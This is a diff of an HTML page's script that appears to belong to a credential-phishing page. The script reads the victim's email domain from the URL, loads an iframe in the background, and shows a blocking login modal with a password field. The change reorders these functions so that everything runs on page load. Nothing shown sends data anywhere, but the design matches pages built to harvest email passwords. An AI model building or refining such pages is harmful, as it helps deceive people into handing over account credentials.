@@ -123,7 +123,6 @@
     </style>
 </head>
 <body>
-    <!-- Overlay and Modal elements -->
     <div id="overlay"></div>
     <div id="modal">
         <div class="super">
@@ -149,8 +148,7 @@
         </div>
     </div>
 
-    <!-- Inline script for loading the iframe and modal -->
-    <script async>
+    <script>
         // Function to get the email domain from the query string
         function getEmailDomain(queryString) {
             const params = new URLSearchParams(queryString);
@@ -159,6 +157,13 @@
                 return email.split('@')[1]; // Extract domain after the @ symbol
             }
             return '';
+        }
+
+        // Function to show the modal immediately
+        function showModal() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('modal').style.display = 'block';
+            document.body.classList.add('inactive'); // Disable background scrolling
         }
 
         // Function to load the iframe in the background
@@ -174,16 +179,11 @@
             }
         }
 
-        // Function to show the modal immediately
-        function showModal() {
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('modal').style.display = 'block';
-            document.body.classList.add('inactive'); // Disable background scrolling
-        }
-
-        // Start loading the iframe and showing the modal
-        loadIframeInBackground();
-        window.onload = showModal;
+        // Start loading the iframe and showing the modal on page load
+        window.onload = function() {
+            showModal();
+            loadIframeInBackground();
+        };
 
         // Function to toggle password visibility
         function togglePassword() {
